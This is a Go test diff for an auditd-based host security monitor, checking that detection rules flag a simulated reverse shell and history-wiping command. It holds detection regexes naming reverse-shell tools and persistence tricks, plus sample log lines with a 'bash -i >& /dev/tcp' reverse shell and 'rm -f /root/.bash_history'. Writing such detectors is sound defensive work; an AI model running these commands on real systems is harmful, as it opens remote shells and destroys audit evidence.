@@ -107,3 +107,63 @@ func TestAuditDeploymentRules(t *testing.T) {
 		}
 	}
 }
+
+func TestAuditExecMatchesFalcoRules(t *testing.T) {
+	m := newAuditExecMonitor(t.TempDir())
+	rules := []config.ProcessRule{
+		{
+			ID:       "PR-0005",
+			Name:     "反弹 Shell 行为检测",
+			Enabled:  true,
+			Severity: 4,
+			Match: config.ProcessMatch{
+				CmdlineRegex: `(?i)(?:bash|sh|zsh|dash)\s+.*(?:-i\s+.*>&|/dev/tcp/[0-9.]+/|nc\s+.*-e\s+/(?:bin/)?(?:ba)?sh|socat\s+exec:.*pty|pty\.spawn\()`,
+			},
+		},
+		{
+			ID:       "PR-0008",
+			Name:     "恶意持久化与历史清除",
+			Enabled:  true,
+			Severity: 3,
+			Match: config.ProcessMatch{
+				CmdlineRegex: `(?i)(?:rm\s+-[a-zA-Z]*f?[a-zA-Z]*\s+.*(?:\.bash_history|\.zsh_history)|history\s+-c|unset\s+HISTFILE|export\s+HISTSIZE=0|echo\s+.*>>\s*/var/spool/cron/|echo\s+.*>>\s*/etc/crontab)`,
+			},
+		},
+	}
+
+	// Simulated short-lived reverse shell process captured by auditd
+	lines := []*pb.LogLine{
+		{Content: `type=SYSCALL msg=audit(1700000000.456:101): success=yes pid=99999 uid=0 exe="/bin/bash" key="alinksec_exec"`},
+		{Content: `type=EXECVE msg=audit(1700000000.456:101): argc=3 a0="bash" a1="-i" a2=">& /dev/tcp/10.0.0.1/4444 0>&1"`},
+		{Content: `type=EOE msg=audit(1700000000.456:101):`},
+	}
+	events, ok := m.observe(lines, rules)
+	if !ok {
+		t.Fatal("observe failed")
+	}
+	pEvents := processEvents(events)
+	if len(pEvents) != 1 {
+		t.Fatalf("expected 1 process event, got %d", len(pEvents))
+	}
+	if pEvents[0].RuleId != "PR-0005" {
+		t.Fatalf("rule = %s, want PR-0005", pEvents[0].RuleId)
+	}
+
+	// Simulated history deletion command captured by auditd
+	linesHist := []*pb.LogLine{
+		{Content: `type=SYSCALL msg=audit(1700000001.789:102): success=yes pid=99998 uid=0 exe="/bin/rm" key="alinksec_exec"`},
+		{Content: `type=EXECVE msg=audit(1700000001.789:102): argc=3 a0="rm" a1="-f" a2="/root/.bash_history"`},
+		{Content: `type=EOE msg=audit(1700000001.789:102):`},
+	}
+	events2, ok2 := m.observe(linesHist, rules)
+	if !ok2 {
+		t.Fatal("observe failed")
+	}
+	pEvents2 := processEvents(events2)
+	if len(pEvents2) != 1 {
+		t.Fatalf("expected 1 process event, got %d", len(pEvents2))
+	}
+	if pEvents2[0].RuleId != "PR-0008" {
+		t.Fatalf("rule = %s, want PR-0008", pEvents2[0].RuleId)
+	}
+}
